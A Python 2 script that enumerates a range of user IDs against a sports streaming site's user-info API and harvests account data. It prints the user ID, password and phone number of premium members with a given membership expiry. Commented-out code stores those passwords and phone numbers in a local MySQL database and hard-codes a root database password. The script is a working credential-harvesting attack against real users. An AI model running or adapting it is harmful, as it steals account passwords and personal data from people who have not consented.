#!/usr/bin/env python
# coding=utf-8
# author=ntwu

import requests
import json
import MySQLdb
import threadpool as tp
import sys
import datetime
import time
from pyquery import PyQuery as pq

# 新英体育账户密码
datas = []
for i in range(17935334,17999999):
	datas.append(i)
vip = []
def test(arg_):
	r = requests.get("http://user.ssports.com/api/user/userId/%s/getUserInfo?callback=jQuery17209425971896507943_1505658314851&_=1505658314949"%arg_)
	# json_data = json.loads(r.content)
	json_data = json.loads(r.content[41:-1])
	data = json_data['data']
	if data['level']== None:
		pass
	if data['level']:
		vip = data['level']
		membership = data['membership']
		userId = int(data['userId'])
		passwd = data['password']
		if  vip== 'NORMAL' or vip == None:
			pass

		elif vip == 'SVIP':
			membership = data['membership']
			if membership != {}:
				if membership['diamond'] ==   '2018-05-31':
					print membership,userId,passwd,data['tel']
	# else :
	# 	diamond = membership['diamond']
	# 	if diamond != '2017-09-30' and  diamond != '':
	# 	try:
	# 		conn = MySQLdb.connect(host='127.0.0.1', user='root', passwd='hades', port=3306, charset='utf8')
	# 		cur = conn.cursor()
	# 		# cur.execute('create database if not exists python')
	# 		conn.select_db('python')
	# 		cur.execute("INSERT INTO vip_info VALUES (%s,'%s',%s) "%(userId,passwd,tel))
	# 		conn.commit()
	# 		print('ok')
	# 		cur.close()
	# 		conn.close()
	# 	except MySQLdb.Error, e:
	# 		print "Mysql Error %d: %s" % (e.args[0], e.args[1])
	# if membership != {}:
	# 		print data['level']
	# 	teams = membership['teams']
	# 	print teams


	# if data['level'] == 'SVIP':
	# 	membership = data['membership']
	# 	try:
	# 		conn = MySQLdb.connect(host='127.0.0.1', user='root', passwd='hades', port=3306, charset='utf8')
	# 		cur = conn.cursor()
	# 		# cur.execute('create database if not exists python')
	# 		conn.select_db('python')
	# 		cur.execute("INSERT INTO ssports_info VALUES (%s,'%s',%s) "%())
	# 		cur.commit()
	# 		cur.close()
	# 		conn.close()
	# 	except MySQLdb.Error, e:
	# 		print "Mysql Error %d: %s" % (e.args[0], e.args[1])

pool = tp.ThreadPool(2)
reqs = tp.makeRequests(test, datas)
[pool.putRequest(req) for req in reqs]
pool.wait()

